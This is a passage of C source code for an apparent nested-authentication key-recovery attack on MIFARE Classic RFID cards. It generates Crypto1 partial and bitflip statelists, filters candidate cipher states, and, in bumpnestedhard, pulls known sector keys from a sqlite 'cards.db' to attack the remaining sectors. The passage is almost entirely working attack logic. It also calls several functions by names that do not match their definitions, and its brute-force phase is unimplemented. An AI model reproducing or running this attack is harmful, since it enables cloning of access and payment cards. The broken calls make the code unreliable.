				bump_partial_statelist[i].index[odd_even][j] = NULL;
			}
		}
	}
		
	printf("Generating partial statelists...\n");
	for (odd_even_t odd_even = EVEN_STATE; odd_even <= ODD_STATE; odd_even++) {
		uint32_t index = -1;
		uint32_t num_of_states = 1<<20;
		for (uint32_t state = 0; state < num_of_states; state++) {
			uint16_t sum_property = bump_PartialSumProperty(state, odd_even);
			uint32_t *p = bump_partial_statelist[sum_property].states[odd_even];
			p += bump_partial_statelist[sum_property].len[odd_even];
			*p = state;
			bump_partial_statelist[sum_property].len[odd_even]++;
			uint32_t index_mask = (STATELIST_INDEX_SIZE-1) << (20-STATELIST_INDEX_WIDTH);
			if ((state & index_mask) != index) {
				index = state & index_mask;
			}
			if (bump_partial_statelist[sum_property].index[odd_even][index >> (20-STATELIST_INDEX_WIDTH)] == NULL) {
				bump_partial_statelist[sum_property].index[odd_even][index >> (20-STATELIST_INDEX_WIDTH)] = p;
			}
		}
		// add End Of List markers
		for (uint16_t i = 0; i <= 16; i += 2) {
			uint32_t *p = bump_partial_statelist[i].states[odd_even];
			p += bump_partial_statelist[i].len[odd_even];
			*p = 0xffffffff;
		}
	}
	
	return 0;
}	
		

 void bump_init_BitFlip_statelist(void)
{
	printf("Generating bitflip statelist...\n");
	uint32_t *p = bump_statelist_bitflip.states[0] = malloc(sizeof(uint32_t) * 1<<20);
	uint32_t index = -1;
	uint32_t index_mask = (STATELIST_INDEX_SIZE-1) << (20-STATELIST_INDEX_WIDTH);
	for (uint32_t state = 0; state < (1 << 20); state++) {
		if (filter(state) != filter(state^1)) {
			if ((state & index_mask) != index) {
				index = state & index_mask;
			}
			if (bump_statelist_bitflip.index[0][index >> (20-STATELIST_INDEX_WIDTH)] == NULL) {
				bump_statelist_bitflip.index[0][index >> (20-STATELIST_INDEX_WIDTH)] = p;
			}
			*p++ = state;
		}
	}
	// set len and add End Of List marker
	bump_statelist_bitflip.len[0] = p - bump_statelist_bitflip.states[0];
	*p = 0xffffffff;
	bump_statelist_bitflip.states[0] = realloc(bump_statelist_bitflip.states[0], sizeof(uint32_t) * (bump_statelist_bitflip.len[0] + 1));
}


 inline uint32_t *find_first_state(uint32_t state, uint32_t mask, partial_indexed_statelist_t *sl, odd_even_t odd_even)
{
	uint32_t *p = sl->index[odd_even][(state & mask) >> (20-STATELIST_INDEX_WIDTH)];		// first Bits as index

	if (p == NULL) return NULL;
	while (*p < (state & mask)) p++;
	if (*p == 0xffffffff) return NULL;					// reached end of list, no match
	if ((*p & mask) == (state & mask)) return p;		// found a match.
	return NULL;										// no match
} 


 inline bool /*__attribute__((always_inline))*/ invariant_holds(uint_fast8_t byte_diff, uint_fast32_t state1, uint_fast32_t state2, uint_fast8_t bit, uint_fast8_t state_bit)
{
	uint_fast8_t j_1_bit_mask = 0x01 << (bit-1);
	uint_fast8_t bit_diff = byte_diff & j_1_bit_mask;							 			// difference of (j-1)th bit
	uint_fast8_t filter_diff = filter(state1 >> (4-state_bit)) ^ filter(state2 >> (4-state_bit));	// difference in filter function
	uint_fast8_t mask_y12_y13 = 0xc0 >> state_bit;
	uint_fast8_t state_bits_diff = (state1 ^ state2) & mask_y12_y13;						// difference in state bits 12 and 13
	uint_fast8_t all_diff = evenparity8(bit_diff ^ state_bits_diff ^ filter_diff);			// use parity function to XOR all bits
	return !all_diff;
}


 inline bool /*__attribute__((always_inline))*/ invalid_state(uint_fast8_t byte_diff, uint_fast32_t state1, uint_fast32_t state2, uint_fast8_t bit, uint_fast8_t state_bit)
{
	uint_fast8_t j_bit_mask = 0x01 << bit;
	uint_fast8_t bit_diff = byte_diff & j_bit_mask;											// difference of jth bit
	uint_fast8_t mask_y13_y16 = 0x48 >> state_bit;
	uint_fast8_t state_bits_diff = (state1 ^ state2) & mask_y13_y16;						// difference in state bits 13 and 16
	uint_fast8_t all_diff = evenparity8(bit_diff ^ state_bits_diff);						// use parity function to XOR all bits
	return all_diff;
}


 inline bool bump_remaining_bits_match(uint_fast8_t num_bump_common_bits, uint_fast8_t byte_diff, uint_fast32_t state1, uint_fast32_t state2, odd_even_t odd_even)
{
	if (odd_even) {
		// odd bits
		switch (num_bump_common_bits) {
			case 0: if (!invariant_holds(byte_diff, state1, state2, 1, 0)) return true;
			case 1: if (invalid_state(byte_diff, state1, state2, 1, 0)) return false;
			case 2: if (!invariant_holds(byte_diff, state1, state2, 3, 1)) return true;
			case 3: if (invalid_state(byte_diff, state1, state2, 3, 1)) return false;
			case 4: if (!invariant_holds(byte_diff, state1, state2, 5, 2)) return true;
			case 5: if (invalid_state(byte_diff, state1, state2, 5, 2)) return false;
			case 6: if (!invariant_holds(byte_diff, state1, state2, 7, 3)) return true;
			case 7: if (invalid_state(byte_diff, state1, state2, 7, 3)) return false;
		}
	} else {
		// even bits
		switch (num_bump_common_bits) {
			case 0: if (invalid_state(byte_diff, state1, state2, 0, 0)) return false;
			case 1: if (!invariant_holds(byte_diff, state1, state2, 2, 1)) return true;
			case 2: if (invalid_state(byte_diff, state1, state2, 2, 1)) return false;
			case 3: if (!invariant_holds(byte_diff, state1, state2, 4, 2)) return true;
			case 4: if (invalid_state(byte_diff, state1, state2, 4, 2)) return false;
			case 5: if (!invariant_holds(byte_diff, state1, state2, 6, 3)) return true;
			case 6: if (invalid_state(byte_diff, state1, state2, 6, 3)) return false;
		}
	}
	
	return true;					// valid state
}


 bool bump_all_other_first_bytes_match(uint32_t state, odd_even_t odd_even)
{
	for (uint16_t i = 1; i < bump_num_good_first_bytes; i++) {
		uint16_t sum_a8 = bump_nonces[bump_best_first_bytes[i]].Sum8_guess;
		uint_fast8_t bytes_diff = bump_best_first_bytes[0] ^ bump_best_first_bytes[i];
		uint_fast8_t j = bump_common_bits(bytes_diff);
		uint32_t mask = 0xfffffff0;
		if (odd_even == ODD_STATE) {
			mask >>= j/2;
		} else {
			mask >>= (j+1)/2;
		}
		mask &= 0x000fffff;
		//printf("bytes 0x%02x and 0x%02x: %d common bits, mask = 0x%08x, state = 0x%08x, sum_a8 = %d", bump_best_first_bytes[0], bump_best_first_bytes[i], j, mask, state, sum_a8);
		bool found_match = false;
		for (uint16_t r = 0; r <= 16 && !found_match; r += 2) {
			for (uint16_t s = 0; s <= 16 && !found_match; s += 2) {
				if (r*(16-s) + (16-r)*s == sum_a8) {
					//printf("Checking byte 0x%02x for partial sum (%s) %d\n", bump_best_first_bytes[i], odd_even==ODD_STATE?"odd":"even", odd_even==ODD_STATE?r:s);
					uint16_t part_sum_a8 = (odd_even == ODD_STATE) ? r : s;
					uint32_t *p = find_first_state(state, mask, &bump_partial_statelist[part_sum_a8], odd_even);
					if (p != NULL) {
						while ((state & mask) == (*p & mask) && (*p != 0xffffffff)) {
							if (bump_remaining_bits_match(j, bytes_diff, state, (state&0x00fffff0) | *p, odd_even)) {
								found_match = true;
								// if ((odd_even == ODD_STATE && state == test_state_odd)
									// || (odd_even == EVEN_STATE && state == test_state_even)) {
									// printf("bump_all_other_first_bytes_match(): %s test state: remaining bits matched. Bytes = %02x, %02x, Common Bits=%d, mask=0x%08x, PartSum(a8)=%d\n",
										// odd_even==ODD_STATE?"odd":"even", bump_best_first_bytes[0], bump_best_first_bytes[i], j, mask, part_sum_a8);
								// }
								break;
							} else {
								// if ((odd_even == ODD_STATE && state == test_state_odd)
									// || (odd_even == EVEN_STATE && state == test_state_even)) {
									// printf("bump_all_other_first_bytes_match(): %s test state: remaining bits didn't match. Bytes = %02x, %02x, Common Bits=%d, mask=0x%08x, PartSum(a8)=%d\n",
										// odd_even==ODD_STATE?"odd":"even", bump_best_first_bytes[0], bump_best_first_bytes[i], j, mask, part_sum_a8);
								// }
							}
							p++;
						}	
					} else {
						// if ((odd_even == ODD_STATE && state == test_state_odd)
							// || (odd_even == EVEN_STATE && state == test_state_even)) {
							// printf("bump_all_other_first_bytes_match(): %s test state: couldn't find a matching state. Bytes = %02x, %02x, Common Bits=%d, mask=0x%08x, PartSum(a8)=%d\n",
								// odd_even==ODD_STATE?"odd":"even", bump_best_first_bytes[0], bump_best_first_bytes[i], j, mask, part_sum_a8);
						// }
					}		
				}
			}
		}

		if (!found_match) {
			// if ((odd_even == ODD_STATE && state == test_state_odd)
				// || (odd_even == EVEN_STATE && state == test_state_even)) {
				// printf("bump_all_other_first_bytes_match(): %s test state: Eliminated. Bytes = %02x, %02x, Common Bits = %d\n", odd_even==ODD_STATE?"odd":"even", bump_best_first_bytes[0], bump_best_first_bytes[i], j);
			// }
			return false;
		}
	}	
			
	return true;
}


 bool bump_all_bit_flips_match(uint32_t state, odd_even_t odd_even)
{
	for (uint16_t i = 0; i < 256; i++) {
		if (bump_nonces[i].BitFlip[odd_even] && i != bump_best_first_bytes[0]) {
			uint_fast8_t bytes_diff = bump_best_first_bytes[0] ^ i;
			uint_fast8_t j = bump_common_bits(bytes_diff);
			uint32_t mask = 0xfffffff0;
			if (odd_even == ODD_STATE) {
				mask >>= j/2;
			} else {
				mask >>= (j+1)/2;
			}
			mask &= 0x000fffff;
			//printf("bytes 0x%02x and 0x%02x: %d common bits, mask = 0x%08x, state = 0x%08x, sum_a8 = %d", bump_best_first_bytes[0], bump_best_first_bytes[i], j, mask, state, sum_a8);
			bool found_match = false;
			uint32_t *p = find_first_state(state, mask, &bump_statelist_bitflip, 0);
			if (p != NULL) {
				while ((state & mask) == (*p & mask) && (*p != 0xffffffff)) {
					if (bump_remaining_bits_match(j, bytes_diff, state, (state&0x00fffff0) | *p, odd_even)) {
						found_match = true;
						// if ((odd_even == ODD_STATE && state == test_state_odd)
							// || (odd_even == EVEN_STATE && state == test_state_even)) {
							// printf("bump_all_other_first_bytes_match(): %s test state: remaining bits matched. Bytes = %02x, %02x, Common Bits=%d, mask=0x%08x, PartSum(a8)=%d\n",
								// odd_even==ODD_STATE?"odd":"even", bump_best_first_bytes[0], bump_best_first_bytes[i], j, mask, part_sum_a8);
						// }
						break;
					} else {
						// if ((odd_even == ODD_STATE && state == test_state_odd)
							// || (odd_even == EVEN_STATE && state == test_state_even)) {
							// printf("bump_all_other_first_bytes_match(): %s test state: remaining bits didn't match. Bytes = %02x, %02x, Common Bits=%d, mask=0x%08x, PartSum(a8)=%d\n",
								// odd_even==ODD_STATE?"odd":"even", bump_best_first_bytes[0], bump_best_first_bytes[i], j, mask, part_sum_a8);
						// }
					}
					p++;
				}	
			} else {
				// if ((odd_even == ODD_STATE && state == test_state_odd)
					// || (odd_even == EVEN_STATE && state == test_state_even)) {
					// printf("bump_all_other_first_bytes_match(): %s test state: couldn't find a matching state. Bytes = %02x, %02x, Common Bits=%d, mask=0x%08x, PartSum(a8)=%d\n",
						// odd_even==ODD_STATE?"odd":"even", bump_best_first_bytes[0], bump_best_first_bytes[i], j, mask, part_sum_a8);
				// }
			}		
			if (!found_match) {
				// if ((odd_even == ODD_STATE && state == test_state_odd)
					// || (odd_even == EVEN_STATE && state == test_state_even)) {
					// printf("bump_all_other_first_bytes_match(): %s test state: Eliminated. Bytes = %02x, %02x, Common Bits = %d\n", odd_even==ODD_STATE?"odd":"even", bump_best_first_bytes[0], bump_best_first_bytes[i], j);
				// }
				return false;
			}
		}

	}
	
	return true;
}


 struct sl_cache_entry {
	uint32_t *sl;
	uint32_t len;
	} sl_cache[17][17][2];


 void bump_init_statelist_cache(void)
{
	for (uint16_t i = 0; i < 17; i+=2) {
		for (uint16_t j = 0; j < 17; j+=2) {
			for (uint16_t k = 0; k < 2; k++) {
				sl_cache[i][j][k].sl = NULL;
				sl_cache[i][j][k].len = 0;
			}
		}
	}		
}

	
 int bump_add_matching_states(statelist_t *bump_candidates, uint16_t part_sum_a0, uint16_t part_sum_a8, odd_even_t odd_even)
{
	uint32_t worstcase_size = 1<<20;

	// check cache for existing results
	if (sl_cache[part_sum_a0][part_sum_a8][odd_even].sl != NULL) {
		bump_candidates->states[odd_even] = sl_cache[part_sum_a0][part_sum_a8][odd_even].sl;
		bump_candidates->len[odd_even] = sl_cache[part_sum_a0][part_sum_a8][odd_even].len;
		return 0;
	}
	
	bump_candidates->states[odd_even] = (uint32_t *)malloc(sizeof(uint32_t) * worstcase_size);
	if (bump_candidates->states[odd_even] == NULL) {
		PrintAndLog("Out of memory error.\n");
		return 4;
	}
	uint32_t *add_p = bump_candidates->states[odd_even];
	for (uint32_t *p1 = bump_partial_statelist[part_sum_a0].states[odd_even]; *p1 != 0xffffffff; p1++) {
		uint32_t search_mask = 0x000ffff0;
		uint32_t *p2 = find_first_state((*p1 << 4), search_mask, &bump_partial_statelist[part_sum_a8], odd_even);
		if (p2 != NULL) {
			while (((*p1 << 4) & search_mask) == (*p2 & search_mask) && *p2 != 0xffffffff) {
				if ((bump_nonces[bump_best_first_bytes[0]].BitFlip[odd_even] && find_first_state((*p1 << 4) | *p2, 0x000fffff, &bump_statelist_bitflip, 0))
					|| !bump_nonces[bump_best_first_bytes[0]].BitFlip[odd_even]) {
					if (bump_all_other_first_bytes_match((*p1 << 4) | *p2, odd_even)) {
						if (bump_all_bit_flips_match((*p1 << 4) | *p2, odd_even)) {
							*add_p++ = (*p1 << 4) | *p2;
						}
					}
				}
				p2++;
			}
		}
	}

	// set end of list marker and len
	*add_p = 0xffffffff; 
	bump_candidates->len[odd_even] = add_p - bump_candidates->states[odd_even];

	bump_candidates->states[odd_even] = realloc(bump_candidates->states[odd_even], sizeof(uint32_t) * (bump_candidates->len[odd_even] + 1));

	sl_cache[part_sum_a0][part_sum_a8][odd_even].sl = bump_candidates->states[odd_even];
	sl_cache[part_sum_a0][part_sum_a8][odd_even].len = bump_candidates->len[odd_even];

	return 0;
}


 statelist_t *bump_add_more_candidates(statelist_t *current_bump_candidates)
{
	statelist_t *new_bump_candidates = NULL;
	if (current_bump_candidates == NULL) {
		if (bump_candidates == NULL) {
			bump_candidates = (statelist_t *)malloc(sizeof(statelist_t));
		}
		new_bump_candidates = bump_candidates;
	} else {
		new_bump_candidates = current_bump_candidates->next = (statelist_t *)malloc(sizeof(statelist_t));
	}
	new_bump_candidates->next = NULL;
	new_bump_candidates->len[ODD_STATE] = 0;
	new_bump_candidates->len[EVEN_STATE] = 0;
	new_bump_candidates->states[ODD_STATE] = NULL;
	new_bump_candidates->states[EVEN_STATE] = NULL;
	return new_bump_candidates;
}


 void bump_TestIfKeyExists(uint64_t key)
{
	struct Crypto1State *pcs;
	pcs = crypto1_create(key);
	crypto1_byte(pcs, (bump_cuid >> 24) ^ bump_best_first_bytes[0], true);

	uint32_t state_odd = pcs->odd & 0x00ffffff;
	uint32_t state_even = pcs->even & 0x00ffffff;
	//printf(" bump_Tests: searching for key %llx after first byte 0x%02x (state_odd = 0x%06x, state_even = 0x%06x) ...\n", key, bump_best_first_bytes[0], state_odd, state_even);
	
	uint64_t count = 0;
	for (statelist_t *p = bump_candidates; p != NULL; p = p->next) {
		bool found_odd = false;
		bool found_even = false;
		uint32_t *p_odd = p->states[ODD_STATE];
		uint32_t *p_even = p->states[EVEN_STATE];
		while (*p_odd != 0xffffffff) {
			if ((*p_odd & 0x00ffffff) == state_odd) {
				found_odd = true;
				break;
			}
			p_odd++;
		}
		while (*p_even != 0xffffffff) {
			if ((*p_even & 0x00ffffff) == state_even) {
				found_even = true;
			}
			p_even++;
		}
		count += (p_odd - p->states[ODD_STATE]) * (p_even - p->states[EVEN_STATE]);
		if (found_odd && found_even) {
			PrintAndLog("Key Found after testing %lld (2^%1.1f) out of %lld (2^%1.1f) keys. A brute force would have taken approx %lld minutes.", 
				count, log(count)/log(2), 
				bump_maximum_states, log(bump_maximum_states)/log(2),
				(count>>23)/60);
			if (bump_write_stats) {
				fprintf(bump_fstats, "1\n");
			}
			crypto1_destroy(pcs);
			return;
		}
	}

	printf("Key NOT found!\n");
	if (bump_write_stats) {
		fprintf(bump_fstats, "0\n");
	}
	crypto1_destroy(pcs);
}


 void bump_generate_bump_candidates(uint16_t sum_a0, uint16_t sum_a8)
{
	printf("Generating crypto1 state bump_candidates... \n");
	
	statelist_t *current_bump_candidates = NULL;
	// estimate maximum candidate states
	bump_maximum_states = 0;
	for (uint16_t sum_odd = 0; sum_odd <= 16; sum_odd += 2) {
		for (uint16_t sum_even = 0; sum_even <= 16; sum_even += 2) {
			if (sum_odd*(16-sum_even) + (16-sum_odd)*sum_even == sum_a0) {
				bump_maximum_states += (uint64_t)bump_partial_statelist[sum_odd].len[ODD_STATE] * bump_partial_statelist[sum_even].len[EVEN_STATE] * (1<<8);
			}
		}
	}
	printf("Number of possible keys with Sum(a0) = %d: %lld (2^%1.1f)\n", sum_a0, bump_maximum_states, log(bump_maximum_states)/log(2.0));
	
	init_statelist_cache();
	
	for (uint16_t p = 0; p <= 16; p += 2) {
		for (uint16_t q = 0; q <= 16; q += 2) {
			if (p*(16-q) + (16-p)*q == sum_a0) {
				printf("Reducing Partial Statelists (p,q) = (%d,%d) with lengths %d, %d\n", 
						p, q, bump_partial_statelist[p].len[ODD_STATE], bump_partial_statelist[q].len[EVEN_STATE]);
				for (uint16_t r = 0; r <= 16; r += 2) {
					for (uint16_t s = 0; s <= 16; s += 2) {
						if (r*(16-s) + (16-r)*s == sum_a8) {
							current_bump_candidates = bump_add_more_candidates(current_bump_candidates);
							// check for the smallest partial statelist. Try this first - it might give 0 bump_candidates
							// and eliminate the need to calculate the other part
							if (MIN(bump_partial_statelist[p].len[ODD_STATE], bump_partial_statelist[r].len[ODD_STATE])
									< MIN(bump_partial_statelist[q].len[EVEN_STATE], bump_partial_statelist[s].len[EVEN_STATE])) {
								add_matching_states(current_bump_candidates, p, r, ODD_STATE);
								if(current_bump_candidates->len[ODD_STATE]) {
									add_matching_states(current_bump_candidates, q, s, EVEN_STATE);
								} else {
									current_bump_candidates->len[EVEN_STATE] = 0;
									uint32_t *p = current_bump_candidates->states[EVEN_STATE] = malloc(sizeof(uint32_t));
									*p = 0xffffffff;
								}
							} else {
								add_matching_states(current_bump_candidates, q, s, EVEN_STATE);
								if(current_bump_candidates->len[EVEN_STATE]) {
									add_matching_states(current_bump_candidates, p, r, ODD_STATE);
								} else {
									current_bump_candidates->len[ODD_STATE] = 0;
									uint32_t *p = current_bump_candidates->states[ODD_STATE] = malloc(sizeof(uint32_t));
									*p = 0xffffffff;
								}
							}
							printf("Odd  state bump_candidates: %6d (2^%0.1f)\n", current_bump_candidates->len[ODD_STATE], log(current_bump_candidates->len[ODD_STATE])/log(2));
							printf("Even state bump_candidates: %6d (2^%0.1f)\n", current_bump_candidates->len[EVEN_STATE], log(current_bump_candidates->len[EVEN_STATE])/log(2));
						}
					}
				}
			}
		}
	}					

	
	bump_maximum_states = 0;
	for (statelist_t *sl = bump_candidates; sl != NULL; sl = sl->next) {
		bump_maximum_states += (uint64_t)sl->len[ODD_STATE] * sl->len[EVEN_STATE];
	}
	printf("Number of remaining possible keys: %lld (2^%1.1f)\n", bump_maximum_states, log(bump_maximum_states)/log(2.0));
	if (bump_write_stats) {
		if (bump_maximum_states != 0) {
			fprintf(bump_fstats, "%1.1f;", log(bump_maximum_states)/log(2.0));
		} else {
			fprintf(bump_fstats, "%1.1f;", 0.0);
		}
	}
}


 void	bump_free_bump_candidates_memory(statelist_t *sl)
{
	if (sl == NULL) {
		return;
	} else {
		bump_free_bump_candidates_memory(sl->next);
		free(sl);
	}
}


 void bump_free_statelist_cache(void)
{
	for (uint16_t i = 0; i < 17; i+=2) {
		for (uint16_t j = 0; j < 17; j+=2) {
			for (uint16_t k = 0; k < 2; k++) {
				free(sl_cache[i][j][k].sl);
			}
		}
	}		
}


 void bump_brute_force(void)
{
	if (bump_known_target_key != -1) {
		PrintAndLog("Looking for known target key in remaining key space...");
		bump_TestIfKeyExists(bump_known_target_key);
	} else {
		PrintAndLog("Brute Force phase is not implemented.");
	}

}


int bumpnestedhard(uint8_t cardSize, uint64_t uid)
{
	uint8_t blockNo = 0;
	uint8_t keyType = 0;
	uint8_t key[] = {0xff,0xff,0xff,0xff,0xff,0xff};
	uint8_t SectorsCnt = 0;
	sector *e_sector = NULL;


	switch(cardSize) {
		case 0: SectorsCnt =  5; break;
		case 1: SectorsCnt = 16; break;
		case 2: SectorsCnt = 32; break;
		case 4: SectorsCnt = 40; break;
		default:  SectorsCnt = 16; break;
	}

	e_sector = calloc(SectorsCnt, sizeof(sector));
	if (e_sector == NULL) return -1;

	sqlite3 *db;
	sqlite3_stmt *sqlRes;
	int rc = sqlite3_open("cards.db", &db);
	char q[1024];
	uint8_t keyA[6], keyB[6];
	bool first = TRUE;

	PrintAndLog("Loading db keys");
	for (int i = 0; i < SectorsCnt; i++) {
		snprintf(q, sizeof(q), "SELECT * FROM keys WHERE UID='%08"llx"' AND block = '%3d';", uid, LastBlockOfSector(i));

		rc = sqlite3_prepare_v2(db, q, -1, &sqlRes, 0);
		if (rc != SQLITE_OK) {
			PrintAndLog("Failed to fetch data: %s\n", sqlite3_errmsg(db));
		}
		rc = sqlite3_step(sqlRes);

		if (rc == SQLITE_ROW) {
			e_sector[i].foundKey[0] = sqlite3_column_type(sqlRes, 2) != 5;// 5 -> null type
			e_sector[i].foundKey[1] = sqlite3_column_type(sqlRes, 3) != 5;

			if(e_sector[i].foundKey[0]){
				stringToUID(keyA, 6, sqlite3_column_text(sqlRes, 2));
				e_sector[i].Key[0] = bytes_to_num(keyA, 6);

				if(first){
					blockNo = LastBlockOfSector(i);
					memcpy(key, keyA, 6);
					keyType = 0;

					first = FALSE;
				}
			}

			if(e_sector[i].foundKey[1]){
				stringToUID(keyB, 6, sqlite3_column_text(sqlRes, 3));
				e_sector[i].Key[1] = bytes_to_num(keyB, 6);

				if(first){
					blockNo = LastBlockOfSector(i);
					memcpy(key, keyB, 6);
					keyType = 1;

					first = FALSE;
				}
			}

		}
		sqlite3_finalize(sqlRes);
	}
	sqlite3_close(db);

	if(first) return 5;

	// initialize Random number generator
	time_t t;
	srand((unsigned) time(&t));
	
	for (uint8_t sectorNo = 0; sectorNo < SectorsCnt; sectorNo++) {
		for (uint8_t trgKeyType = 0; trgKeyType < 2; trgKeyType++) {
			if (e_sector[sectorNo].foundKey[trgKeyType]) continue;
	
			bump_init_partial_statelists();
			bump_init_BitFlip_statelist();
			bump_init_nonce_memory();

			// acquire nonces.
			uint16_t is_OK = bump_acquire_nonces(uid, blockNo, keyType, key, FirstBlockOfSector(sectorNo), trgKeyType);
			if (is_OK != 0) {
				return is_OK;
			}

			bump_free_nonces_memory();
			bump_free_statelist_cache();
			bump_free_bump_candidates_memory(bump_candidates);
			bump_candidates = NULL;
		}
	}

	return 0;
}


